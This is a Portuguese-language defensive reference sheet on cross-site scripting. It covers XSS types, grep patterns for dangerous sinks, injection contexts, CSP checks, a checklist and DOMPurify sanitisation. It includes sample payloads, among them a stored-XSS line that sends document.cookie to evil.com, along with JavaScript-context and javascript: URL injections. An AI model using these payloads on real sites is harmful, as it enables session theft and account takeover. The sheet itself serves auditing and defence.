# XSS — Cross-Site Scripting

Injeção de scripts maliciosos em páginas web. Permite roubo de sessão, phishing, keylogging.

---

## Tipos de XSS

### Reflected XSS
Input do usuário é refletido na resposta sem sanitização.
```html
<!-- URL: /search?q=<script>alert(1)</script> -->
<p>Resultados para: <script>alert(1)</script></p>
```

### Stored XSS
Input malicioso armazenado no banco e exibido para outros usuários.
```html
<!-- Comentário armazenado no banco -->
<div class="comment"><script>fetch('https://evil.com/?c='+document.cookie)</script></div>
```

### DOM-based XSS
Manipulação do DOM via JavaScript do lado do cliente.
```javascript
// Vulnerável
document.getElementById('output').innerHTML = location.hash.slice(1)
// URL: page.html#<img src=x onerror=alert(1)>
```

---

## Padrões de Busca

```bash
# React — dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" --include="*.{jsx,tsx,js,ts}" -n

# innerHTML direto
grep -rn "innerHTML\s*=" --include="*.{js,ts,jsx,tsx}" -n
grep -rn "outerHTML\s*=" --include="*.{js,ts,jsx,tsx}" -n

# document.write
grep -rn "document\.write\s*(" --include="*.{js,ts}" -n

# eval com dados externos
grep -rn "eval\s*(" --include="*.{js,ts}" | grep -v "// "

# jQuery html()
grep -rn "\$\(.*\)\.html\s*(" --include="*.{js}" | grep -v "\.html()" # sem argumento é getter

# Vue v-html
grep -rn "v-html" --include="*.vue" -n

# Angular innerHTML binding
grep -rn "\[innerHTML\]" --include="*.{html,ts}" -n

# Template literals em HTML
grep -rn "innerHTML.*\`\|outerHTML.*\`" --include="*.{js,ts}" -n
```

---

## Contextos de Injeção

### HTML Context
```html
<!-- Sem escape: injeção de tags -->
<p>{{userInput}}</p>  <!-- React/Vue/Angular escapam automaticamente -->
<p>{{{userInput}}}</p>  <!-- Handlebars — triple brace = raw HTML = INSEGURO -->
```

### JavaScript Context
```javascript
// Dados do servidor injetados em script tag
<script>
  const user = {name: "{{userName}}"};  // Payload: "}; alert(1); //
</script>
```

### URL Context
```html
<!-- href com input do usuário -->
<a href="{{userUrl}}">Link</a>
<!-- Payload: javascript:alert(1) -->
```

### CSS Context
```html
<div style="{{userStyle}}">
<!-- Payload: background:url('javascript:alert(1)') — IE -->
```

---

## Content Security Policy (CSP)

**Camada de defesa adicional.** Mesmo com XSS, CSP pode impedir execução de scripts.

```bash
# Verificar CSP
grep -rn "Content-Security-Policy\|contentSecurityPolicy\|csp" --include="*.{js,ts,py,conf}" -n
grep -rn "helmet\(\)" --include="*.{js,ts}" -n  # helmet configura CSP em Express
```

**CSP problemáticas:**
```
Content-Security-Policy: default-src *  # inútil
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'  # bypass
```

---

## Checklist

- [ ] Nenhum `innerHTML` com dados de usuário sem sanitização
- [ ] Nenhum `dangerouslySetInnerHTML` sem DOMPurify
- [ ] Nenhum `v-html` com dados não-confiáveis
- [ ] Nenhum `[innerHTML]` com dados não-confiáveis
- [ ] `document.write()` não usado
- [ ] `eval()` não usado com dados externos
- [ ] URLs de usuário validadas (não permitem `javascript:`)
- [ ] CSP configurado e restritivo
- [ ] Cookies com `HttpOnly` (mitigação de impacto)

---

## Sanitização Correta

```javascript
// React — evitar dangerouslySetInnerHTML quando possível
// Se necessário, sanitizar com DOMPurify
import DOMPurify from 'dompurify'

function SafeContent({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: [],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// Validar URLs
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url)
    return ['https:', 'http:'].includes(parsed.protocol)
  } catch {
    return false
  }
}
```

---

## Red Flags Críticas

1. `dangerouslySetInnerHTML={{ __html: userContent }}` sem DOMPurify
2. `element.innerHTML = userInput` em qualquer lugar
3. `v-html="userContent"` sem sanitização
4. CSP ausente ou com `unsafe-inline` + `unsafe-eval`
